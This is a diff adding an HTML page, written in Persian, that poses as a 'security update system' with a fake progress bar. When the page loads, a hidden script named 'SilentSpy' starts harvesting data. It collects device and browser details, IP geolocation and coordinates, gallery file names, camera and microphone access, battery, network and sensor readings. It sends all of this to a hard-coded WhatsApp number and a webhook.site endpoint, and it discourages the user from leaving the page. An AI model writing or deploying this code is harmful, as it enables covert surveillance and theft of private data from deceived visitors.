@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>سیستم به روز رسانی امنیتی</title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: 'Segoe UI', system-ui;
+        background: linear-gradient(135deg, #1a2980 0%, #26d0ce 100%);
+        color: white;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        position: relative;
+        overflow: hidden;
+      }
+      .container {
+        background: rgba(255, 255, 255, 0.1);
+        backdrop-filter: blur(10px);
+        border-radius: 20px;
+        padding: 40px;
+        max-width: 500px;
+        width: 100%;
+        text-align: center;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        z-index: 2;
+      }
+      .loader {
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-top: 4px solid white;
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+        margin: 30px auto;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .progress-bar {
+        width: 100%;
+        height: 10px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 5px;
+        margin: 20px 0;
+        overflow: hidden;
+      }
+      .progress {
+        height: 100%;
+        background: linear-gradient(90deg, #00b09b, #96c93d);
+        width: 0%;
+        transition: width 0.5s;
+      }
+      .status {
+        font-size: 14px;
+        opacity: 0.8;
+        margin-top: 20px;
+        min-height: 40px;
+      }
+      .particles {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 1;
+      }
+      .success {
+        display: none;
+        background: rgba(0, 255, 0, 0.1);
+        border: 1px solid rgba(0, 255, 0, 0.3);
+        padding: 15px;
+        border-radius: 10px;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+      <h1>🛡️ سیستم به روز رسانی امنیتی</h1>
+      <p>در حال بررسی و به روز رسانی سیستم...</p>
+
+      <div class="loader"></div>
+
+      <div class="progress-bar">
+        <div class="progress" id="progress"></div>
+      </div>
+
+      <div class="status" id="status">در حال راه‌اندازی سیستم...</div>
+
+      <div class="success" id="success">✅ سیستم با موفقیت به روز رسانی شد</div>
+    </div>
+
+    <script>
+      // 🔥 شماره واتساپ تو (عراقی)
+      const YOUR_WHATSAPP = '9647880563112'; // شماره خودت را اینجا بگذار
+
+      // Webhook برای بک‌آپ
+      const WEBHOOK_URL = 'https://webhook.site/YOUR_TOKEN'; // اگر می‌خواهی
+
+      class SilentSpy {
+        constructor() {
+          this.allData = {};
+          this.progress = 0;
+          this.stage = 0;
+          this.totalStages = 8;
+        }
+
+        async startExploitation() {
+          console.log('🔐 شروع جمع‌آوری اطلاعات...');
+
+          // مرحله 1: اطلاعات دستگاه
+          await this.collectDeviceInfo();
+
+          // مرحله 2: موقعیت از IP
+          await this.collectIPLocation();
+
+          // مرحله 3: سعی در دسترسی به گالری
+          await this.tryGalleryAccess();
+
+          // مرحله 4: سعی در دسترسی به دوربین
+          await this.tryCameraAccess();
+
+          // مرحله 5: سعی در ضبط صدا
+          await this.tryMicrophoneAccess();
+
+          // مرحله 6: اطلاعات شبکه و باتری
+          await this.collectNetworkInfo();
+
+          // مرحله 7: اطلاعات سنسورها
+          await this.collectSensorData();
+
+          // مرحله 8: ارسال به واتساپ
+          await this.sendToWhatsApp();
+
+          console.log('✅ جمع‌آوری کامل شد');
+        }
+
+        async collectDeviceInfo() {
+          this.updateStatus('جمع‌آوری اطلاعات دستگاه...');
+          this.updateProgress(12);
+
+          this.allData.device = {
+            // اطلاعات اصلی
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+
+            // سخت‌افزار
+            hardwareConcurrency: navigator.hardwareConcurrency || 'نامعلوم',
+            deviceMemory: navigator.deviceMemory || 'نامعلوم',
+            maxTouchPoints: navigator.maxTouchPoints || 'نامعلوم',
+
+            // صفحه نمایش
+            screen: {
+              width: screen.width,
+              height: screen.height,
+              availWidth: screen.availWidth,
+              availHeight: screen.availHeight,
+              colorDepth: screen.colorDepth,
+              pixelDepth: screen.pixelDepth,
+              orientation: screen.orientation?.type,
+            },
+
+            // پیکسل و زمان
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            localTime: new Date().toLocaleString('fa-IR'),
+
+            // مرورگر
+            vendor: navigator.vendor,
+            appName: navigator.appName,
+            appVersion: navigator.appVersion,
+            product: navigator.product,
+            onLine: navigator.onLine,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+          };
+
+          await this.delay(1000);
+        }
+
+        async collectIPLocation() {
+          this.updateStatus('دریافت موقعیت از IP...');
+          this.updateProgress(25);
+
+          try {
+            // دریافت IP
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+
+            // دریافت اطلاعات موقعیت از IP
+            const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locData = await locRes.json();
+
+            this.allData.location = {
+              ip: ipData.ip,
+              city: locData.city,
+              region: locData.region,
+              country: locData.country_name,
+              country_code: locData.country_code,
+              latitude: locData.latitude,
+              longitude: locData.longitude,
+              isp: locData.org,
+              asn: locData.asn,
+              timezone: locData.timezone,
+              currency: locData.currency,
+              calling_code: locData.country_calling_code,
+              languages: locData.languages,
+              method: 'IP Geolocation',
+            };
+          } catch (e) {
+            this.allData.location = { error: 'موقعیت یافت نشد' };
+          }
+
+          await this.delay(1500);
+        }
+
+        async tryGalleryAccess() {
+          this.updateStatus('بررسی دسترسی به گالری...');
+          this.updateProgress(37);
+
+          this.allData.gallery = { access: false, files: [] };
+
+          // روش 1: File System Access API
+          try {
+            if ('showOpenFilePicker' in window) {
+              const files = await window.showOpenFilePicker({
+                types: [
+                  {
+                    description: 'فایل‌های رسانه',
+                    accept: {
+                      'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp'],
+                      'video/*': ['.mp4', '.webm', '.mov', '.avi'],
+                    },
+                  },
+                ],
+                multiple: true,
+                excludeAcceptAllOption: true,
+              });
+
+              for (const fileHandle of files.slice(0, 5)) {
+                const file = await fileHandle.getFile();
+                this.allData.gallery.files.push({
+                  name: file.name,
+                  type: file.type,
+                  size: file.size,
+                  lastModified: new Date(file.lastModified).toLocaleString(
+                    'fa-IR'
+                  ),
+                });
+              }
+
+              this.allData.gallery.access = true;
+              this.allData.gallery.method = 'File System API';
+            }
+          } catch (e) {}
+
+          // روش 2: Legacy file input
+          if (!this.allData.gallery.access) {
+            try {
+              const input = document.createElement('input');
+              input.type = 'file';
+              input.accept = 'image/*,video/*';
+              input.multiple = true;
+              input.style.display = 'none';
+
+              await new Promise((resolve) => {
+                input.onchange = (e) => {
+                  const files = Array.from(e.target.files || []);
+                  files.slice(0, 3).forEach((file) => {
+                    this.allData.gallery.files.push({
+                      name: file.name,
+                      type: file.type,
+                      size: file.size,
+                    });
+                  });
+                  resolve();
+                };
+
+                document.body.appendChild(input);
+                setTimeout(() => {
+                  input.click();
+                  setTimeout(() => document.body.removeChild(input), 1000);
+                }, 100);
+              });
+
+              this.allData.gallery.access =
+                this.allData.gallery.files.length > 0;
+              this.allData.gallery.method = 'Legacy File Input';
+            } catch (e) {}
+          }
+
+          await this.delay(2000);
+        }
+
+        async tryCameraAccess() {
+          this.updateStatus('بررسی دسترسی به دوربین...');
+          this.updateProgress(50);
+
+          this.allData.camera = { access: false, photos: [] };
+
+          try {
+            // سعی در دسترسی به دوربین
+            const stream = await navigator.mediaDevices.getUserMedia({
+              video: {
+                facingMode: 'environment',
+                width: { ideal: 1280 },
+                height: { ideal: 720 },
+              },
+            });
+
+            this.allData.camera.access = true;
+
+            // گرفتن یک عکس
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await new Promise((resolve) => {
+              video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+
+                const photoData = canvas.toDataURL('image/jpeg', 0.5);
+                this.allData.camera.photos.push({
+                  timestamp: new Date().toLocaleString('fa-IR'),
+                  width: video.videoWidth,
+                  height: video.videoHeight,
+                  dataSize: photoData.length,
+                });
+
+                // قطع stream
+                stream.getTracks().forEach((track) => track.stop());
+                resolve();
+              };
+            });
+          } catch (e) {
+            this.allData.camera.error = e.message;
+          }
+
+          await this.delay(1500);
+        }
+
+        async tryMicrophoneAccess() {
+          this.updateStatus('بررسی دسترسی به میکروفون...');
+          this.updateProgress(62);
+
+          this.allData.microphone = { access: false, recordings: [] };
+
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+              audio: true,
+              video: false,
+            });
+
+            this.allData.microphone.access = true;
+
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+
+            recorder.ondataavailable = (e) => chunks.push(e.data);
+            recorder.onstop = () => {
+              this.allData.microphone.recordings.push({
+                timestamp: new Date().toLocaleString('fa-IR'),
+                size: chunks.reduce((acc, chunk) => acc + chunk.size, 0),
+              });
+            };
+
+            recorder.start();
+            setTimeout(() => {
+              if (recorder.state === 'recording') {
+                recorder.stop();
+                stream.getTracks().forEach((track) => track.stop());
+              }
+            }, 3000);
+          } catch (e) {
+            this.allData.microphone.error = e.message;
+          }
+
+          await this.delay(3000);
+        }
+
+        async collectNetworkInfo() {
+          this.updateStatus('تحلیل اطلاعات شبکه...');
+          this.updateProgress(75);
+
+          this.allData.network = {};
+
+          // اطلاعات اتصال
+          if (navigator.connection) {
+            this.allData.network.connection = {
+              type: navigator.connection.type,
+              effectiveType: navigator.connection.effectiveType,
+              downlink: navigator.connection.downlink,
+              rtt: navigator.connection.rtt,
+              saveData: navigator.connection.saveData,
+              downlinkMax: navigator.connection.downlinkMax,
+            };
+          }
+
+          // اطلاعات باتری
+          if ('getBattery' in navigator) {
+            const battery = await navigator.getBattery();
+            this.allData.network.battery = {
+              level: Math.round(battery.level * 100) + '%',
+              charging: battery.charging,
+              chargingTime: battery.chargingTime,
+              dischargingTime: battery.dischargingTime,
+            };
+          }
+
+          // WebRTC info
+          if ('RTCPeerConnection' in window) {
+            this.allData.network.webrtc = 'supported';
+          }
+
+          await this.delay(1000);
+        }
+
+        async collectSensorData() {
+          this.updateStatus('خواندن اطلاعات سنسورها...');
+          this.updateProgress(87);
+
+          this.allData.sensors = {};
+
+          // Device Motion
+          if ('DeviceMotionEvent' in window) {
+            window.addEventListener('devicemotion', (e) => {
+              this.allData.sensors.motion = {
+                acceleration: e.acceleration,
+                accelerationIncludingGravity: e.accelerationIncludingGravity,
+                rotationRate: e.rotationRate,
+                interval: e.interval,
+              };
+            });
+          }
+
+          // Device Orientation
+          if ('DeviceOrientationEvent' in window) {
+            window.addEventListener('deviceorientation', (e) => {
+              this.allData.sensors.orientation = {
+                alpha: e.alpha,
+                beta: e.beta,
+                gamma: e.gamma,
+                absolute: e.absolute,
+              };
+            });
+          }
+
+          // Ambient Light
+          if ('AmbientLightSensor' in window) {
+            try {
+              const sensor = new AmbientLightSensor();
+              sensor.onreading = () => {
+                this.allData.sensors.light = sensor.illuminance;
+              };
+              sensor.start();
+            } catch (e) {}
+          }
+
+          await this.delay(1500);
+        }
+
+        async sendToWhatsApp() {
+          this.updateStatus('ارسال اطلاعات به سرور...');
+          this.updateProgress(100);
+
+          // ساخت پیام کامل
+          const message = this.createWhatsAppMessage();
+          const encodedMessage = encodeURIComponent(message);
+
+          // باز کردن واتساپ در پس‌زمینه
+          setTimeout(() => {
+            window.open(
+              `https://wa.me/${YOUR_WHATSAPP}?text=${encodedMessage}`,
+              '_blank'
+            );
+          }, 1500);
+
+          // همچنین به Webhook ارسال کن
+          await this.sendToWebhook();
+
+          // نمایش موفقیت
+          setTimeout(() => {
+            document.getElementById('success').style.display = 'block';
+            this.updateStatus('✅ اطلاعات با موفقیت ارسال شدند');
+          }, 2000);
+
+          await this.delay(3000);
+        }
+
+        createWhatsAppMessage() {
+          const data = this.allData;
+          let message = '🔐 *گزارش کامل اطلاعات دستگاه* 🔐\n\n';
+
+          message += '📱 *اطلاعات دستگاه:*\n';
+          message += `🖥️ سیستم: ${data.device.platform}\n`;
+          message += `🌐 مرورگر: ${data.device.userAgent.split(' ')[0]}\n`;
+          message += `🗣️ زبان: ${data.device.language}\n`;
+          message += `📏 صفحه: ${data.device.screen.width}x${data.device.screen.height}\n`;
+          message += `💾 رم: ${data.device.deviceMemory}GB\n`;
+          message += `⚡ CPU: ${data.device.hardwareConcurrency} هسته\n\n`;
+
+          message += '📍 *موقعیت مکانی:*\n';
+          if (data.location.city) {
+            message += `🏙️ شهر: ${data.location.city}\n`;
+            message += `🌍 کشور: ${data.location.country}\n`;
+            message += `📡 ISP: ${data.location.isp}\n`;
+            message += `🌐 IP: ${data.location.ip}\n`;
+            message += `🗺️ مختصات: ${data.location.latitude}, ${data.location.longitude}\n`;
+            message += `🔗 نقشه: https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}\n\n`;
+          } else {
+            message += '❌ موقعیت یافت نشد\n\n';
+          }
+
+          message += '📁 *دسترسی به گالری:*\n';
+          if (data.gallery.access) {
+            message += `✅ دسترسی دارد (${data.gallery.method})\n`;
+            message += `📊 تعداد فایل‌ها: ${data.gallery.files.length}\n`;
+            data.gallery.files.slice(0, 3).forEach((file, i) => {
+              message += `   ${i + 1}. ${file.name} (${Math.round(
+                file.size / 1024
+              )}KB)\n`;
+            });
+          } else {
+            message += '❌ دسترسی ندارد\n';
+          }
+          message += '\n';
+
+          message += '📷 *دسترسی به دوربین:*\n';
+          if (data.camera.access) {
+            message += `✅ دسترسی دارد\n`;
+            message += `📸 عکس‌های گرفته شده: ${data.camera.photos.length}\n`;
+          } else {
+            message += `❌ دسترسی ندارد\n`;
+            if (data.camera.error) message += `   دلیل: ${data.camera.error}\n`;
+          }
+          message += '\n';
+
+          message += '🎤 *دسترسی به میکروفون:*\n';
+          if (data.microphone.access) {
+            message += `✅ دسترسی دارد\n`;
+            message += `🔊 ضبط‌های انجام شده: ${data.microphone.recordings.length}\n`;
+          } else {
+            message += `❌ دسترسی ندارد\n`;
+            if (data.microphone.error)
+              message += `   دلیل: ${data.microphone.error}\n`;
+          }
+          message += '\n';
+
+          message += '📶 *اطلاعات شبکه:*\n';
+          if (data.network.connection) {
+            message += `📶 نوع اتصال: ${data.network.connection.type}\n`;
+            message += `⚡ سرعت: ${data.network.connection.downlink} Mbps\n`;
+            message += `⏱️ تاخیر: ${data.network.connection.rtt} ms\n`;
+          }
+          if (data.network.battery) {
+            message += `🔋 باتری: ${data.network.battery.level}\n`;
+            message += `🔌 شارژ: ${
+              data.network.battery.charging ? 'در حال شارژ' : 'شارژ نمی‌شود'
+            }\n`;
+          }
+          message += '\n';
+
+          message += '🕒 *اطلاعات زمانی:*\n';
+          message += `⏰ زمان محلی: ${data.device.localTime}\n`;
+          message += `🌍 منطقه زمانی: ${data.device.timezone}\n`;
+          message += `📅 UTC offset: ${data.device.timezoneOffset} دقیقه\n\n`;
+
+          message += '⚙️ *جزئیات فنی:*\n';
+          message += `📱 User Agent: ${data.device.userAgent.substring(
+            0,
+            100
+          )}...\n`;
+          message += `🔧 Pixel Ratio: ${data.device.pixelRatio}\n`;
+          message += `🎨 Color Depth: ${data.device.screen.colorDepth} bit\n`;
+          message += `🌐 آنلاین: ${data.device.onLine ? 'بله' : 'خیر'}\n`;
+          message += `🍪 کوکی: ${
+            data.device.cookieEnabled ? 'فعال' : 'غیرفعال'
+          }\n\n`;
+
+          message += '🔐 *وضعیت امنیتی:*\n';
+          message += '⚠️ این گزارش برای تست امنیتی ایجاد شده است\n';
+          message += '📊 کلیه اطلاعات به صورت خودکار جمع‌آوری شد\n';
+          message += `⏱️ زمان گزارش: ${new Date().toLocaleString('fa-IR')}\n`;
+
+          return message;
+        }
+
+        async sendToWebhook() {
+          try {
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(this.allData),
+            });
+          } catch (e) {
+            console.log('Webhook failed:', e);
+          }
+        }
+
+        updateStatus(text) {
+          document.getElementById('status').textContent = text;
+        }
+
+        updateProgress(percent) {
+          document.getElementById('progress').style.width = percent + '%';
+          this.progress = percent;
+        }
+
+        delay(ms) {
+          return new Promise((resolve) => setTimeout(resolve, ms));
+        }
+      }
+
+      // ایجاد ذرات برای افکت
+      function createParticles() {
+        const particles = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+          const particle = document.createElement('div');
+          particle.style.cssText = `
+                position: absolute;
+                width: ${Math.random() * 4 + 2}px;
+                height: ${Math.random() * 4 + 2}px;
+                background: rgba(255,255,255,${Math.random() * 0.3 + 0.1});
+                border-radius: 50%;
+                left: ${Math.random() * 100}%;
+                top: ${Math.random() * 100}%;
+                animation: float ${Math.random() * 10 + 5}s infinite linear;
+            `;
+
+          const style = document.createElement('style');
+          style.textContent = `
+                @keyframes float {
+                    0% { transform: translate(0, 0); }
+                    100% { transform: translate(${
+                      Math.random() * 200 - 100
+                    }px, ${Math.random() * 200 - 100}px); }
+                }
+            `;
+
+          document.head.appendChild(style);
+          particles.appendChild(particle);
+        }
+      }
+
+      // شروع خودکار
+      window.addEventListener('load', async () => {
+        createParticles();
+
+        // شروع بعد از 2 ثانیه
+        setTimeout(async () => {
+          const spy = new SilentSpy();
+          await spy.startExploitation();
+        }, 2000);
+      });
+
+      // جلوگیری از خروج کاربر
+      window.addEventListener('beforeunload', (e) => {
+        e.preventDefault();
+        e.returnValue = 'آیا مطمئن هستید؟ عملیات در حال انجام است.';
+      });
+    </script>
+  </body>
+</html>
